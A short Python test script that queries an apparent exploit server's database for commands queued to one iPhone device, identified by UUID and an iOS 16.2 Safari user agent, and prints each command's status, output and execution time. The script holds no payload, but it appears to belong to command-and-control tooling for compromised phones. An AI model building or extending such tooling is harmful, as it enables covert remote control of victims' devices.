import sys
sys.path.insert(0, '.')
from admin.database import SessionLocal
from exploit_server import get_pending_commands

# Test with the actual device
uuid = "ios-4a0d2f80840d7442667e3947"
ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1"

print(f"Testing get_pending_commands for {uuid}")
print(f"UA: {ua[:80]}")

cmds = get_pending_commands(uuid, ua)
print(f"\nResult: {len(cmds)} commands returned")
for c in cmds:
    print(f"  ID={c.id} | CMD={c.command[:40]:<40} | STATUS={c.status}")

# Also check what's directly in the DB
db = SessionLocal()
from admin.database import Command
all_cmds = db.query(Command).filter(Command.device_uuid == uuid).all()
print(f"\nAll commands in DB for this device: {len(all_cmds)}")
for c in all_cmds:
    print(f"  ID={c.id} | CMD={c.command[:40]:<40} | STATUS={c.status:<12} | OUTPUT={str(c.output)[:50]:<50} | EXEC_AT={c.executed_at}")
db.close()
